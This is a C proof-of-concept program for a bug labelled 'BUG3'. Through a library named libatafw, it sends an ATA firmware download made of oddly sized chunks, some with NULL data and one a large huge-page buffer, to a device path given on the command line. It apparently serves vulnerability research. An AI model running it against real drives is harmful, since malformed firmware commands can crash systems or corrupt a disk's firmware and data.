#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libatafw/libatafw.h>
#include "common.h"

#define MAP_HUGE_1GB									(30U << 26)

#define BUG3_FIRST_BUFFER_SIZE							(0x200 * LIBATAFW_SECTOR_SIZE)
#define BUG3_SECOND_BUFFER_SIZE							(0x400 * LIBATAFW_SECTOR_SIZE)
#define BUG3_LAST_BUFFER_SIZE							(0xFC00 * LIBATAFW_SECTOR_SIZE)

static struct ata_fw_chunk chunks[] = {
	{
		.offset = 0,
		.chunk_data = NULL,
		.chunk_size = BUG3_FIRST_BUFFER_SIZE
	},
	{
		.offset = BUG3_FIRST_BUFFER_SIZE,
		.chunk_data = NULL,
		.chunk_size = BUG3_SECOND_BUFFER_SIZE
	},
};

void print_buffer(const uint8_t *buffer, uint32_t buffer_size)
{
	uint32_t i = 0;

	for (i = 0; i < buffer_size; i++) {
		printf("%02x\n", buffer[i]);
	}
}

int main(int argc, char *argv[])
{
	int main_ret = MAIN_RESULT_FAILURE;
	enum ata_fw_error status = ATA_FW_ERR_UNINITIALIZED;
	void *last_fw_chunk = MAP_FAILED;
	uint8_t sense_buffer[LIBATAFW_SENSE_BUFFER_LENGTH];

	if (NUM_MAIN_ARGS != argc) {
		printf("Usage: %s <device path>\n", argv[0]);
		goto l_cleanup;
	}

	memset(sense_buffer, 0, sizeof(sense_buffer));

	status = libatafw__init(argv[1]);
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: could not initialize libatafw. Initialization returned: %d\n", status);
		goto l_cleanup;
	}

	status = libatafw__enqueue_multiple_firmware_chunks(chunks, sizeof(chunks) / sizeof(chunks[0]));
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: could not enqueue at least one firmware chunk. libatafw returned: %d\n", status);
		goto l_cleanup;
	}

	last_fw_chunk = mmap(NULL, BUG3_LAST_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MAP_HUGE_1GB, -1, 0);
	if (MAP_FAILED == last_fw_chunk) {
		printf("Error: could not map the last buffer!\n");
		goto l_cleanup;
	}

	status = libatafw__enqueue_firmware_chunk(BUG3_FIRST_BUFFER_SIZE + BUG3_SECOND_BUFFER_SIZE, last_fw_chunk, BUG3_LAST_BUFFER_SIZE);
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: could not enqueue the last firmware chunk!\n");
		goto l_cleanup;
	}

	status = libatafw__execute_requests(false, NULL, sense_buffer);
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: an error encountered while executing the request. libatafw status: %d\n", status);
		print_buffer(sense_buffer, sizeof(sense_buffer));
		goto l_cleanup;
	}

	main_ret = MAIN_RESULT_SUCCESS;
l_cleanup:
	if (MAP_FAILED != last_fw_chunk) {
		munmap(last_fw_chunk, BUG3_LAST_BUFFER_SIZE);
	}

	libatafw__deinit();

	return main_ret;
}
